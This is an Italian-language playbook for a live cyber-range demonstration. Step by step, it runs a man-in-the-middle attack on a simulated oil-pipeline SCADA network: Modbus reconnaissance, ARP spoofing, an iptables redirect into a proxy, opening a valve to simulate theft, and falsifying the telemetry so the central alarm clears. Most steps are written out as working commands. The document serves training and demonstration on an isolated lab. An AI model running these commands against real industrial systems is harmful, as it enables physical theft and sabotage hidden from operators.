# OT Pipeline Range — Playbook attacco MANUALE (Kali), passo per passo

Per fare l'attacco **a mano** davanti al pubblico: ogni primitiva separata e visibile,
invece del pulsante della console che fa tutto insieme.

> Sostituisci gli IP e l'interfaccia con i tuoi:
> `CENTRAL=10.10.50.10` · `MILITARYAIRPORT1=10.10.10.13` · `GW=10.10.10.150` · `IFACE=eth0`
> Comodo esportarli una volta sull'attacker:
> ```bash
> export CENTRAL=10.10.50.10 MILITARYAIRPORT1=10.10.10.13 GW=10.10.10.150 IFACE=eth0
> cd ot-pipeline-range
> ```

## Schermi da proiettare
- **Centro** (SCADA centrale) e **HMI Military Airport 1** (sul suo box) — affiancati.
- Sulla **Kali** apri **4 terminali** (T1..T4). I processi "vivi" (ARP, proxy) restano
  in foreground così si vedono lavorare.

---

## Step 0 — Ricognizione (vedere il bersaglio)
**T1** — guarda il Modbus che scorre tra workstation e Centro (prima dell'attacco):
```bash
sudo tcpdump -i "$IFACE" -n tcp port 502
```
**T2** — leggi i registri reali del terminale (ricognizione attiva Red Team):
```bash
.venv/bin/python attacker/mb_read.py "$MILITARYAIRPORT1" 502
#  portata= 450.0 m3/h | pressione=38.0 bar | livello=54.0 % | ...
```
> Messaggio: *"Modbus in chiaro, nessuna autenticazione. Leggo lo stato di processo e
> vedo chi parla con chi."*

## Step 1 — Mettersi in mezzo: ARP spoofing
**T3** (foreground, resta attivo):
```bash
# rete piatta (1 subnet): --b = Centro
sudo .venv/bin/python attacker/arp_spoof.py --a "$MILITARYAIRPORT1" --b "$CENTRAL" --iface "$IFACE"

# TEATRO A 2 SUBNET (Centro oltre il router): --b = GATEWAY della subnet dei siti
#   export GW=10.10.10.150
#   sudo .venv/bin/python attacker/arp_spoof.py --a "$MILITARYAIRPORT1" --b "$GW" --iface "$IFACE"
#  [ARP] avvelenamento in corso (Ctrl-C per fermare)
```
> Perché: l'ARP risolve il **next-hop**. Centro è su un'altra subnet, quindi il sito la
> raggiunge passando dal gateway: è il gateway che Kali deve impersonare.
Verifica (facoltativa) **su Centro**: `arp -a` ora mostra l'IP di Military Airport 1 associato al
**MAC della Kali**. In T1 il traffico 502 comincia a transitare dalla Kali.
> Messaggio: *"Ora Centro crede che io sia Military Airport 1, e Military Airport 1 crede che io sia Centro."*

## Step 2 — Inoltro + dirottamento nel proxy
**T4**:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 502 -j REDIRECT --to-ports 5503
```
> Messaggio: *"Inoltro il traffico, ma il Modbus verso 502 lo faccio passare dal mio proxy."*

## Step 3 — Il furto fisico (apro la valvola)
**T4**:
```bash
curl -s -X POST "http://$MILITARYAIRPORT1:8091/scenario?tap=60"   # spilla 60 m3/h (~1000 L/min)
```
Guarda **Centro**: parte il **banner rosso "ALLARME AMMANCO"**, il nodo Military Airport 1 lampeggia,
bilancio ~7%. In T2 (mb_read) la portata reale è scesa a ~390.
> Messaggio: *"Sto rubando, e per ora si vede: l'operatore ha l'allarme."*

## Step 4 — Il tampering (nascondo tutto)
**T2bis** o riusa T4 — avvia il proxy che falsifica i registri verso Centro (foreground):
```bash
sudo .venv/bin/python attacker/mitm_proxy.py --listen 0.0.0.0:5503 --mode offset --delta 60
#  [MITM] ... modo=offset delta=+60.0
#  [MITM] MASCHERAMENTO | registri falsificati=12 | ultimo reg0=(3883, 4483)
```
Guarda **Centro**: il **banner sparisce, torna verde**, bilancio rientrato.
> Messaggio: *"Stesso furto di un attimo fa, ma ora Centro vede il nominale. L'allarme è 'spento'."*

## Step 5 — La prova del nove
In un terminale libero:
```bash
.venv/bin/python attacker/mb_read.py "$MILITARYAIRPORT1" 502     # VERO sul campo: ~390 m3/h
```
…mentre **Centro** sullo schermo mostra ~450. Reale ≠ riportato: è il tampering.

## Variante stealth (Coerente / Replay)
Questi due modi imparano prima una **baseline nominale**, quindi cambia l'ordine:
1. avvia il proxy **prima** di aprire lo spillamento, con il modo scelto:
   ```bash
   sudo .venv/bin/python attacker/mitm_proxy.py --listen 0.0.0.0:5503 --mode consistent --delta 60 --learn 8
   ```
2. aspetta ~8 s (nel log: da "apprendimento baseline" a "MASCHERAMENTO"),
3. **poi** apri lo spillamento (Step 3).
Con `replay` Centro riceve telemetria "sana" rigiocata: anche livello e pressione restano
coerenti (batte il cross-check inventario).

## Cleanup (ripristino)
```bash
# Ctrl-C su T3 (arp_spoof: ripristina le tabelle ARP) e sul proxy
sudo iptables -t nat -D PREROUTING -p tcp --dport 502 -j REDIRECT --to-ports 5503
sudo sysctl -w net.ipv4.ip_forward=0
curl -s -X POST "http://$MILITARYAIRPORT1:8091/scenario?tap=0"     # chiudi la valvola
```
In alternativa, un colpo solo: `sudo bash attacker/run_mitm.sh stop` (toglie iptables e
forwarding; l'ARP lo ripristini con Ctrl-C su arp_spoof).

---

### Riassunto primitive (cosa è ciascun pezzo)
| Step | Comando | Tecnica (MITRE ICS) |
|---|---|---|
| Recon | `mb_read.py`, `tcpdump` | T0842 Network Sniffing / T0888 |
| In mezzo | `arp_spoof.py` | T0830 Adversary-in-the-Middle |
| Dirottamento | `ip_forward` + `iptables REDIRECT` | — (abilitante) |
| Furto fisico | `curl .../scenario?tap=` | T0836 Modify Parameter (scenario) |
| Tampering | `mitm_proxy.py` | T0832 Manipulation of View · T0856 Spoof Reporting |

> Laboratorio isolato: eseguire solo sulla VLAN del cyber range autorizzato.
